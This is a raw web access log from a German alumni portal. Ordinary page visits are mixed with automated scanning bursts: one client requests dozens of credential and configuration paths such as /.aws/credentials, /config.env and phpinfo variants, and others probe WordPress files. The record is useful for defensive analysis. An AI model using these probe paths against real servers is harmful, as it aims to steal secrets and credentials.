user;timestamp;referer;target;method;status
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-18 12:59:07;;/personen/alumni/details/benjamin-wagner;GET;200
2bded2543cf722df95b48d5fe7a5ab9e1052e46db4a692e9c5be4256c6c0425c;2025-11-18 12:59:42;;/;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:15;;/;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:16;;/;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:18;;/aktuelles/stellenangebote;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:18;;/themen/details/der-start-ins-studium;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:18;;/themen/details/abschied-aus-moabit;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:18;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:18;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:18;;/personen;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:18;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
2f38f1e734cc2f7e3efcc7e1aea7e2aa2eb2da170db57cc5a7a42abc5c334f4b;2025-11-18 13:00:24;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:28;;/phpinfo;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:40;;/phpinfo;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:44;;/phpinfo.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:51;;/_phpinfo.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:51;;/_profiler/phpinfo;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:51;;/_profiler/phpinfo/info.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:52;;/_profiler/phpinfo/phpinfo.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:52;;/wp-config;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:52;;/aws-secret.yaml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:52;;/env.backup;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:52;;/xampp/phpinfo.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:52;;/lara/info.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:52;;/lara/phpinfo.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:52;;/laravel/info.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:53;;/api/shared/config/config.env;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:53;;/api/shared/config.env;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:53;;/config.env;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:53;;/api/config.env;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:53;;/service/email_service.py;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:55;;/server/config/database.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:55;;/scripts/nodemailer.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:57;;/.aws/credentials;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:57;;/info.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:57;;/dashboard/phpinfo.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:58;;/static/js/main.141b0494.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:58;;/static/js/2.ca066a4b.chunk.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:58;;/static/js/main.e85f7a37.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:58;;/admin/server_info.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:58;;/server_info.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:58;;/app_dev.php/_profiler/phpinfo;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:59;;/test.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:59;;/server-info;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:59;;/server-info.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:59;;/secured/phpinfo.php;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:59;;/config.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:00:59;;/server.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/appsettings.json;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/shared/config/config.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/config/aws.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/settings.py;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/config.json;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/main.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/config/constants.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/application.properties;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/public/js/main.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:00;;/js/main.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:01;;/?phpinfo=1;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:04;;/storage/logs/laravel.log;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/karma.conf.json;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/swagger.json;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/swagger.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/gatsby-config.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/backend/config/default.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/app.py;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/admin/controllers/merchant.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/admin/controllers/partner.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/api/config.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:05;;/api/objects/codes.php.save;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/apis/config/config.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/apis/controllers/users.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/app.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/backend/config/development.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/cloud/Scraper.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/config/application.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/config/storage.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/configs/routes-4aug.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/configs/routes.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/configs/s3_config.json;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/controller/admin/post.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:06;;/controller/api/post.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:07;;/controllers/settings.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:07;;/getcpuutil.php-bakworking;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:07;;/helper.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:07;;/helper/EmailHelper.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:07;;/index.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:08;;/index.html;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:10;;/my_env/chakaash.py;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:10;;/my_env/newsletter.py;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:10;;/my_env/palash.py;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:10;;/mytest/astech_robot.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/partner/config/config.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/config/settings.json;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/config/settings.local;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/.circleci/configs/development.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/config/settings.prod;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/user/config/config.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/user/controllers/index.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/.AWS_/credentials;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/config/local.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/backend/config/settings.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/admin/config;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:11;;/appsettings.json;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/.travis.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/aws.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/sms.py;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/config/config.json;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/main.yml;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/helpers/utility.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/server/s3.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/s3.js;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/debug/default/view;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:12;;/aws/credentials;GET;404
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-18 13:01:13;;/.aws/config;GET;404
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-18 13:03:22;;/personen/alumni/details/jana-zenker;GET;200
bab7eed5d1151d97aba18179dccc4e0462e47bfa7bbc04b3b5284ecc0cff8121;2025-11-18 13:05:55;;/personen/alumni/details/sophia-gawron;GET;200
e783db1f4a697614a8c01aa9ece12c5018dc3a280e539620a754706eefb9705e;2025-11-18 13:13:29;;/xmlrpc.php;GET;404
c418584ee86153c26cd1cfa5ed8198e8591611f981f38089293b3c0b2f4b3053;2025-11-18 13:23:34;;/gruppen/hobby/robotik;GET;302
57ebfd77d82a3dff77af256e28e7db614e4e5bed10023c944b24d9585a957c24;2025-11-18 13:38:46;;/personen;GET;200
be3f01b374de08e29468b5217809f4d6f5f4b3197ce7fec03536c94d4ea25ad4;2025-11-18 13:39:30;;/actuator/health;GET;404
c7b746455a8d7e92c9b862454c802ddb01108e08460ee02218bc747ce631b1b1;2025-11-18 13:48:49;;/gruppen/hobby/journalismus;GET;302
a0f4d2d3869c765a0ec69a8ba65f522de59824a47ad8dad613b39128bf494597;2025-11-18 13:48:50;;/gruppen;GET;200
d23c5acbcd7850a17e7aca7ce72680a70c5ed69122fd77ba8fa935825edb8f7b;2025-11-18 13:58:28;;/;GET;200
8fbbccc724eb7ce250a1040de5775ca6c7076910bd95aff91c5984b161493d6f;2025-11-18 13:58:43;;/profile;GET;302
07a047edb847c12d49af296a663c00888d7b86db5cb242c9bbbc05db7f1ffa1b;2025-11-18 13:58:58;;/themen/2;GET;200
3b1f6da3371acbacd56c6b45f023c108e1b0bfc4b20a0a133b97f9f4ff29235a;2025-11-18 13:59:14;;/about/allgemein;GET;200
a55759be94fecfa0de965356635275e7f183edc2e360700330db77a8b9d45c01;2025-11-18 13:59:29;;/personen/all/2;GET;200
f9bb820701a869040053167869fea992098902484c9d4e9a9c145e0dd2e9881a;2025-11-18 13:59:31;;/gruppen/hobby/schreinern-und-bauen;GET;302
1a931910562e780aff930c9dc342a9b8c9199818e59deda01dbfdda3be52d57e;2025-11-18 13:59:45;;/personen/all/5;GET;200
9c5801bfd7f9707abe0b64ae628fc0963304efb92c6ad8551263129f6286f65f;2025-11-18 14:00:00;;/gruppen/hobby/reisen;GET;302
86bb133cff80a97c1bfa2ca14b8e95a27b95db49235912dc95e5dde77ddcf9ed;2025-11-18 14:00:15;;/gruppen/hobby/wandern;GET;302
6c9743fecfe81029431181f85a5fe57616c41ddd2cd82b01fed2dd125d0541e6;2025-11-18 14:00:32;;/gruppen/hobby/fitness;GET;302
07a047edb847c12d49af296a663c00888d7b86db5cb242c9bbbc05db7f1ffa1b;2025-11-18 14:00:47;;/gruppen/hobby/chor;GET;302
98894d44f3a2db2082c8196b9c2003e9652546d7856abbf7915dc87471520dfe;2025-11-18 14:01:02;;/gruppen/hobby/biologie;GET;302
aab8821bf9b9794f106ae6c261e3e639d4f23439374480d47c551cb02da40c47;2025-11-18 14:01:17;;/gruppen/hobby/statistik;GET;302
20017038e8dde17c3d74d624afaa82a001dd1a410fbd800bd4a1db34e043ef39;2025-11-18 14:01:32;;/gruppen/hobby/chemie;GET;302
094c2e7985d9ee289e9d07a3ebbae43d923ed8c2d65995d338d31c5c8418551e;2025-11-18 14:01:47;;/gruppen/hobby/geometrie;GET;302
c2f8bfb9b47e2c21b4de83c2f50aeb892861375d36ca35cbc581d4ce6d5f333c;2025-11-18 14:02:03;;/gruppen/hobby/geschichte;GET;302
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:05;;/;GET;200
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:07;;//wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:08;;//xmlrpc.php?rsd;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:09;;/;GET;200
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:10;;//blog/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:12;;//web/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:14;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:15;;//website/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:16;;//wp/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:17;;//news/wp-includes/wlwmanifest.xml;GET;404
d23c5acbcd7850a17e7aca7ce72680a70c5ed69122fd77ba8fa935825edb8f7b;2025-11-18 14:02:18;;/gruppen/hobby/astronomie;GET;302
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:19;;//2020/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:20;;//2019/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:21;;//shop/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:23;;//wp1/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:25;;//test/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:27;;//wp2/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:28;;//site/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:30;;//cms/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:31;;//sito/wp-includes/wlwmanifest.xml;GET;404
a56e5bdefcc1ddfddb65cccd19ffeca97b773db8e1f61e41074d051c5f42c28b;2025-11-18 14:02:33;;/gruppen/hobby/gesang;GET;302
20017038e8dde17c3d74d624afaa82a001dd1a410fbd800bd4a1db34e043ef39;2025-11-18 14:02:48;;/gruppen/hobby/robotik;GET;302
87c69c159a4e65e76345687ba4e71615cacbbd856a62652a680477529e3f0c7e;2025-11-18 14:03:03;;/gruppen/hobby/finanzbildung;GET;302
8c8b06a4086c021282cd2ba9a9962faf16abec264bbecd736ce5d0cdccdf6947;2025-11-18 14:03:18;;/gruppen/hobby/tanzen;GET;302
3074db19bb60d525fb7a6aba195add2dd51e88b315cdf48c3176d85abd2bd337;2025-11-18 14:03:34;;/gruppen/hobby/gartnern;GET;302
8e57f343159573bba7dd999aa8e61ba577beca007c59cd258a4150bdc4279d3c;2025-11-18 14:03:49;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
8c8b06a4086c021282cd2ba9a9962faf16abec264bbecd736ce5d0cdccdf6947;2025-11-18 14:04:04;;/gruppen/hobby/debattieren;GET;302
5186cee312665497ccb498667a7596feeff3e5902cb2244224d0db51c2d2da5e;2025-11-18 14:04:19;;/gruppen/hobby/abschlussfest;GET;302
92d4668288bd9fc83e518333d95ec4dc5e280e43355f6d1d36ee3f9d05d62f48;2025-11-18 14:04:34;;/gruppen/hobby/skulptur;GET;302
62e36bca544272b98302e4a5f7a41db08ebbc331519fe202de792c22b6f82e4f;2025-11-18 14:04:49;;/gruppen/interesse/entrepreneurship;GET;200
11b9c12ee2382a7db1bc816b512f200420de4f836530fddcb2104ad6be11ac7c;2025-11-18 14:04:52;/;/;GET;200
87d7b6ec6019de2fd240ae2557866749d6762f138ab13d61e93768c58851095a;2025-11-18 14:07:05;;/docs/img/tbl-pupil.png;GET;404
068f61e6d1d47dfcc368cfd95844dd52feac6337502ff4072de7e8213a1b5bc7;2025-11-18 14:10:26;;/aktuelles/stellenangebote;GET;200
2e24c8af45ad1366ce995ec42d562a53484d743ae8e8bae6400ce26fdf785df1;2025-11-18 14:16:39;;/;GET;200
7b90e540c0a4a1c2fd705d2b90acf4ae4231cc1e7d32a858d8e8148023ba213b;2025-11-18 14:26:36;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
60b274e07d211a20a8c229e14eeeae046260d20733c91f2d583ff68d4c2b778a;2025-11-18 14:38:12;;/;GET;200
36431a4737b4580c2a3c2febcd0b43398d95def0aff3d2abe226ef10dbca828f;2025-11-18 14:38:17;;/login;GET;200
332093e1226e33c7a31ecfd2a211e4a44a065e8eb2294bb9a1afc2eeccad2e77;2025-11-18 14:39:54;;/;GET;200
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:26;;/;GET;200
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:27;;//wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:27;;//xmlrpc.php?rsd;GET;404
